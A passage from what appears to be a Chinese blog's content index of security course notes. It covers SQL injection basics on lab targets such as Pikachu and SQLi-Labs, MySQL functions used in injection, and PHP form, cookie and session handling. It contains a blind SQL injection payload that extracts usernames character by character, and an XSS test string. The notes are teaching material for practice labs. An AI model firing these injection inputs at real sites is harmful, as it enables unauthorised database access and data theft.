alt="13.2.15"></p><h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3><p><strong>分别猜解username和password字段中数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=48 and ord(substr((selectgroup_concat(username)from news_users),1,1))=97 -- +如n=9100</span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/13.2.16.png" alt="13.2.16"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-SQL注入1</title>
      <link href="/posts/injection1.html"/>
      <url>/posts/injection1.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><h3 id="SQL注入本质"><a href="#SQL注入本质" class="headerlink" title="SQL注入本质"></a>SQL注入本质</h3><p><strong>SQL注入利用Web应用对后台数据库查询语句处理时存在的安全漏洞</strong></p><ul><li>设计程序时忽略了对某些字符串的检查</li><li>原本程序要执行的代码，拼接了用户输入的数据（嵌入指令）</li></ul><p><img src="/../img/img_artical/net_sec/13.1.1.png" alt="13.1.1"></p><h3 id="SQL注入攻击流程"><a href="#SQL注入攻击流程" class="headerlink" title="SQL注入攻击流程"></a>SQL注入攻击流程</h3><p><strong>第一步：注入探测</strong></p><ul><li>自动方式：使用web渗透测试工具，自动探测</li><li>手动方式：手工构造SQL注入测试语句</li></ul><p><strong>第二步：信息获取</strong></p><ul><li>环境信息：数据库类型，数据库版本，操作系统版本，用户信息等</li><li>数据库信息：数据库表，表字段，字段内容等(加密内容破解)</li></ul><h3 id="部署SQL注入靶场"><a href="#部署SQL注入靶场" class="headerlink" title="部署SQL注入靶场"></a>部署SQL注入靶场</h3><p><strong>安装Web安全渗透测试靶场Pikachu、SQLi-Labs、news</strong></p><p><img src="/../img/img_artical/net_sec/13.1.2.png" alt="13.1.2"></p><h2 id="MySQL基础操作和常用函数"><a href="#MySQL基础操作和常用函数" class="headerlink" title="MySQL基础操作和常用函数"></a>MySQL基础操作和常用函数</h2><h3 id="连接数据库服务器"><a href="#连接数据库服务器" class="headerlink" title="连接数据库服务器"></a>连接数据库服务器</h3><p><strong>连接本机数据库服务</strong></p><ul><li>mysql  [-u 用户名] [-p 密码]</li></ul><p><img src="/../img/img_artical/net_sec/13.1.3.png" alt="13.1.3"></p><h3 id="列出有哪些数据库"><a href="#列出有哪些数据库" class="headerlink" title="列出有哪些数据库"></a>列出有哪些数据库</h3><p><strong>查询当前MySQL服务器上有哪些数据库</strong></p><ul><li>SHOW DATABASES；</li></ul><p><img src="/../img/img_artical/net_sec/13.1.4.png" alt="13.1.4"></p><h3 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h3><p><strong>管理数据库中的表格之前，可以先进入到目标数据库</strong></p><ul><li>USE 库名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use pikachu;</span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure><h3 id="列出数据库中有哪些表"><a href="#列出数据库中有哪些表" class="headerlink" title="列出数据库中有哪些表"></a>列出数据库中有哪些表</h3><p><strong>进入指定数据库以后，可以查询数据库中有哪些表格</strong></p><ul><li>SHOW TABLES;</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+-------------------+</span><br><span class="line">| Tables_in_pikachu |</span><br><span class="line">+-------------------+</span><br><span class="line">| httpinfo          |</span><br><span class="line">| member            |</span><br><span class="line">| message           |</span><br><span class="line">| users             |</span><br><span class="line">| xssblind          |</span><br><span class="line">+-------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="列出表中的所有记录"><a href="#列出表中的所有记录" class="headerlink" title="列出表中的所有记录"></a>列出表中的所有记录</h3><p><strong>查看表格内容</strong></p><ul><li>SELECT  *  FROM  [库名.]表名；</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from member;</span><br><span class="line">+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+</span><br><span class="line">| id | username | pw                               | sex  | phonenum    | address               | email             |</span><br><span class="line">+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+</span><br><span class="line">|  1 | vince    | e10adc3949ba59abbe56e057f20f883e | boy  | 18626545453 | chain                 | vince@pikachu.com |</span><br><span class="line">|  2 | allen    | e10adc3949ba59abbe56e057f20f883e | boy  | 13676767767 | nba 76                | allen@pikachu.com |</span><br><span class="line">|  3 | kobe     | e10adc3949ba59abbe56e057f20f883e | boy  | 15988767673 | nba lakes             | kobe@pikachu.com  |</span><br><span class="line">|  4 | grady    | e10adc3949ba59abbe56e057f20f883e | boy  | 13676765545 | nba hs                | grady@pikachu.com |</span><br><span class="line">|  5 | kevin    | e10adc3949ba59abbe56e057f20f883e | boy  | 13677676754 | Oklahoma City Thunder | kevin@pikachu.com |</span><br><span class="line">|  6 | lucy     | e10adc3949ba59abbe56e057f20f883e | girl | 12345678922 | usa                   | lucy@pikachu.com  |</span><br><span class="line">|  7 | lili     | e10adc3949ba59abbe56e057f20f883e | girl | 18656565545 | usa                   | lili@pikachu.com  |</span><br><span class="line">+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="数据筛选"><a href="#数据筛选" class="headerlink" title="数据筛选"></a>数据筛选</h3><p><strong>结合条件子句筛选部分数据记录</strong></p><ul><li>SELECT  *  FROM  [库名.]表名  WHERE  条件子句；</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,sex,phonenum,email from member where sex=&#x27;girl&#x27;;</span><br><span class="line">+----------+------+-------------+------------------+</span><br><span class="line">| username | sex  | phonenum    | email            |</span><br><span class="line">+----------+------+-------------+------------------+</span><br><span class="line">| lucy     | girl | 12345678922 | lucy@pikachu.com |</span><br><span class="line">| lili     | girl | 18656565545 | lili@pikachu.com |</span><br><span class="line">+----------+------+-------------+------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><ul><li>比较结果为真，则返回1，为假则返回0</li></ul><table><thead><tr><th align="center">类型</th><th align="center">用途</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">&#x3D;</td><td align="center">等于</td><td align="center"></td></tr><tr><td align="center">!&#x3D;、&lt;&gt;</td><td align="center">不等于</td><td align="center"></td></tr><tr><td align="center">&gt;、&gt;&#x3D;</td><td align="center">大于、大于等于</td><td align="center">数值</td></tr><tr><td align="center">&lt;、&lt;&#x3D;</td><td align="center">小于、小于等于</td><td align="center">数值</td></tr><tr><td align="center">IN、NOT IN</td><td align="center">在集合中、不在集合中</td><td align="center"></td></tr><tr><td align="center">BETWEEN</td><td align="center">在两值之间</td><td align="center">数值</td></tr></tbody></table><h3 id="多个条件的组合"><a href="#多个条件的组合" class="headerlink" title="多个条件的组合"></a>多个条件的组合</h3><p><strong>使用多个条件时，通过逻辑操作进行组合（AND优先级高于OR）</strong></p><table><thead><tr><th align="center">类型</th><th align="center">用途</th></tr></thead><tbody><tr><td align="center">OR</td><td align="center">逻辑或</td></tr><tr><td align="center">AND</td><td align="center">逻辑与</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,sex,phonenum,email from member where sex=&#x27;girl&#x27; or id&lt;3;</span><br><span class="line">+----------+------+-------------+-------------------+</span><br><span class="line">| username | sex  | phonenum    | email             |</span><br><span class="line">+----------+------+-------------+-------------------+</span><br><span class="line">| vince    | boy  | 18626545453 | vince@pikachu.com |</span><br><span class="line">| allen    | boy  | 13676767767 | allen@pikachu.com |</span><br><span class="line">| lucy     | girl | 12345678922 | lucy@pikachu.com  |</span><br><span class="line">| lili     | girl | 18656565545 | lili@pikachu.com  |</span><br><span class="line">+----------+------+-------------+-------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h3><p><strong>使用LIKE语句实现相似性检查</strong></p><ul><li>通配符_代表单个不确定字符，%代表0~N个字符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,sex,address from member where address like &#x27;nba%&#x27;;</span><br><span class="line">+----------+-----+-----------+</span><br><span class="line">| username | sex | address   |</span><br><span class="line">+----------+-----+-----------+</span><br><span class="line">| allen    | boy | nba 76    |</span><br><span class="line">| kobe     | boy | nba lakes |</span><br><span class="line">| grady    | boy | nba hs    |</span><br><span class="line">+----------+-----+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p><strong>MySQL注释分为单行注释和多行注释</strong></p><table><thead><tr><th align="center">类型</th><th align="left">用途</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">#</td><td align="left">#注释内容</td><td align="center">单行</td></tr><tr><td align="center">–</td><td align="left">– 注释内容，“杠杠”后需加一个空格</td><td align="center">单行</td></tr><tr><td align="center">&#x2F;*……*&#x2F;</td><td align="left">&#x2F;*<br />   第一行注释内容<br />   第二行注释内容<br />*&#x2F;</td><td align="center">多行</td></tr></tbody></table><h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><p><strong>字符串函数主要用于处理表中的字符串</strong></p><table><thead><tr><th>类型</th><th>用途</th><th>备注</th></tr></thead><tbody><tr><td>LENGTH(s)</td><td>返回字符串s的字符数</td><td></td></tr><tr><td>SUBSTR(s,n,len)</td><td>从字符串s的n位置截取长度为len的字符串</td><td>SUBSTRING()  MID()</td></tr><tr><td>LEFT(s,n)</td><td>返回字符串s的前n个字符</td><td></td></tr><tr><td>CONCAT(s1,s2…sn)</td><td>s1，s2等多个字符串合并为一个字符串</td><td></td></tr><tr><td>GROUP_CONCAT()</td><td>同一分组的多个字符串合并为一个字符串</td><td></td></tr><tr><td>ASCII(s)</td><td>返回字符串s的第一个字符的ASCII码</td><td></td></tr><tr><td>HEX(s)</td><td>将字符串s转换为16进制</td><td></td></tr></tbody></table><h3 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h3><p><strong>返回数据库系统相关信息</strong></p><table><thead><tr><th>类型</th><th>用途</th><th>备注</th></tr></thead><tbody><tr><td>VERSION()</td><td>返回数据库版本号</td><td></td></tr><tr><td>DATABASE()</td><td>返回当前数据库名</td><td></td></tr><tr><td>USER()</td><td>返回当前用户</td><td>SYSTEM_USER()</td></tr><tr><td>@@DATADIR</td><td>返回数据库路径</td><td></td></tr></tbody></table><p><strong>其他一些高级使用</strong></p><table><thead><tr><th>类型</th><th>用途</th><th>备注</th></tr></thead><tbody><tr><td>IF(expr，v1，v2)</td><td>如果表达式成立，返回结果v1；否则返回结果v2</td><td></td></tr><tr><td>SLEEP(n)</td><td>暂停n秒</td><td></td></tr><tr><td>RAND()</td><td>返回0到1的随机数</td><td></td></tr><tr><td>LOAD_FILE()</td><td>读取文件，并返回文件内容</td><td>secure_file_priv&#x3D;</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Web应用基础6</title>
      <link href="/posts/webbase6.html"/>
      <url>/posts/webbase6.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用基础"><a href="#Web应用基础" class="headerlink" title="Web应用基础"></a>Web应用基础</h1><h2 id="PHP表单"><a href="#PHP表单" class="headerlink" title="PHP表单"></a>PHP表单</h2><h3 id="PHP超级全局变量"><a href="#PHP超级全局变量" class="headerlink" title="PHP超级全局变量"></a>PHP超级全局变量</h3><p><strong>什么是PHP超级全局变量</strong></p><ul><li>PHP中预定义了几个超级全局变量（super globals）</li><li>在一个脚本的全部作用域中都可用，不需要特别说明，就可以在函数及类中使用</li></ul><h3 id="PHP接收表单数据"><a href="#PHP接收表单数据" class="headerlink" title="PHP接收表单数据"></a>PHP接收表单数据</h3><p><strong>$_GET、$POST和$_REQUEST</strong></p><ul><li>$POST接受所有以post方式发送的请求</li><li>$_GET接受所有以get方式发送的请求</li><li>$_REQUEST接受get和post方式发送的请求，但是比较慢</li></ul><h3 id="表单get请求"><a href="#表单get请求" class="headerlink" title="表单get请求"></a>表单get请求</h3><p><strong>表单提交方式为get请求</strong></p><ul><li>创建login.html，关键内容如下</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;login.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">    账户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uname&quot;</span>&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>创建login.php文件，内容如下</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;账户：&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;密码：&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="表单post请求"><a href="#表单post请求" class="headerlink" title="表单post请求"></a>表单post请求</h3><p><strong>表单提交方式为post请求</strong></p><ul><li>修改login.html文件，将提交方式修改为post</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;login.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    账户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uname&quot;</span>&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>修改login.php文件，使用$_POST接收数据</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;账户：&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;密码：&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="为空验证"><a href="#为空验证" class="headerlink" title="为空验证"></a>为空验证</h3><p><strong>为了提高安全性，通常需要对用户的表单输入做验证和处理</strong></p><p><strong>必需字段</strong></p><ul><li>如果是必需字段，可以使用empty函数做验证</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$nameErr</span> = <span class="string">&#x27;必须填写用户名&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="正则验证"><a href="#正则验证" class="headerlink" title="正则验证"></a>正则验证</h3><p><strong>正则匹配</strong></p><p><strong>如果需要精确验证，可以使用preg_match()函数进行正则匹配</strong></p><ul><li>案例：验证名称只能包含字母和空格</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-zA-Z]*$/&quot;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$nameErr</span> = <span class="string">&#x27;用户名只允许字母和空格&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><p><strong>对输入的数据处理</strong></p><ul><li>trim()函数去除用户输入数据中不必要的字符(如：空格，tab，换行)</li><li>stripslashes()函数去除用户输入数据中的反斜杠（\）</li><li>htmlspecialchar()函数把一些预定义的字符转换为HTML实体</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;NTD 123&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.<span class="variable">$data</span>.<span class="string">&#x27;|&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">trim</span>(<span class="variable">$data</span>).<span class="string">&#x27;|&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;NTD\123&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.<span class="variable">$data</span>.<span class="string">&#x27;|&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$data</span>).<span class="string">&#x27;|&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;&lt;script&gt;alert(123)&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.<span class="variable">$data</span>.<span class="string">&#x27;|&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$data</span>).<span class="string">&#x27;|&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="PHP-Cookie和Session"><a href="#PHP-Cookie和Session" class="headerlink" title="PHP Cookie和Session"></a>PHP Cookie和Session</h2><h3 id="PHP超级全局变量-1"><a href="#PHP超级全局变量-1" class="headerlink" title="PHP超级全局变量"></a>PHP超级全局变量</h3><p><strong>S_COOKIE和$_SESSION</strong></p><ul><li>Cookie和Session都是为了保存会话状态</li><li>$_COOKIE保存设置的cookie值</li><li>$_SESSION保存和设置session值</li></ul><h3 id="PHP-Cookie介绍"><a href="#PHP-Cookie介绍" class="headerlink" title="PHP Cookie介绍"></a>PHP Cookie介绍</h3><ul><li>HTTP协议本身是无状态的</li><li>Cookie是保存会话状态的一种方式</li><li>Cookie服务器将数据存储在客户端浏览器中</li></ul><h3 id="PHP-Cookie的使用"><a href="#PHP-Cookie的使用" class="headerlink" title="PHP Cookie的使用"></a>PHP Cookie的使用</h3><p><strong>创建cookie</strong></p><ul><li>setcookie()函数用于设置cookie</li><li>setcookie()函数必须位于&lt;html&gt;标签之前</li><li>如果成功，该函数返回true，如果失败则返回false</li></ul><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(name,value,expire)</span><br></pre></td></tr></table></figure><p><strong>参数说明</strong></p><ul><li>name：必选，cookie的名称</li><li>value：必选，cookie的值</li><li>expire：可选，cookie的过期时间，默认浏览器关闭后失效</li></ul><p><strong>案例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;ntd&quot;</span>,<span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>获取cookie</strong></p><ul><li>PHP的$_COOKIE变量用于取回cookie的值</li></ul><p><strong>在获取前，可以使用isset()函数来确认是否已设置了cookie</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;欢迎&#x27;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>删除cookie</strong></p><ul><li>通过设置cookie的时间为过去的时间点来删除cookie</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 设置cookie过期时间为过去一小时</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">time</span>()-<span class="number">3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PHP-Session介绍"><a href="#PHP-Session介绍" class="headerlink" title="PHP Session介绍"></a>PHP Session介绍</h3><ul><li>HTTP协议本身是无状态的</li><li>Session是另外一种保存会话状态的方式</li><li>Session将数据存储在服务器端</li><li>与Cookie相比，数据相对安全</li><li>与Cookie相比，可以存储比较多的数据</li></ul><h3 id="PHP-Session的使用"><a href="#PHP-Session的使用" class="headerlink" title="PHP Session的使用"></a>PHP Session的使用</h3><p><strong>启动会话</strong></p><ul><li>必须先启动会话，然后才可以使用Session</li><li>session_start()函数用于启动会话</li><li>session_start()函数必须位于html标签之前</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>设置和获取Session</strong></p><ul><li>设置和获取Session，都是通过PHP $_SESSION变量实现</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="string">&#x27;tedu&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>销毁和删除Session</strong></p><ul><li>删除某些session数据，可以使用unset()或session_destroy()函数</li><li>unset()函数用于释放指定的session变量</li><li>session_destroy()函数用于彻底销毁session</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PHP访问MySQL数据库"><a href="#PHP访问MySQL数据库" class="headerlink" title="PHP访问MySQL数据库"></a>PHP访问MySQL数据库</h2><h3 id="PHP访问MySQL数据库-1"><a href="#PHP访问MySQL数据库-1" class="headerlink" title="PHP访问MySQL数据库"></a>PHP访问MySQL数据库</h3><ul><li>通过PHP，可以连接和操作数据库</li><li>MySQL是跟PHP配套使用的最流行的开源数据库系统</li><li>MySQL是非常快速，可靠，且易于使用的</li></ul><h3 id="MySQLi介绍"><a href="#MySQLi介绍" class="headerlink" 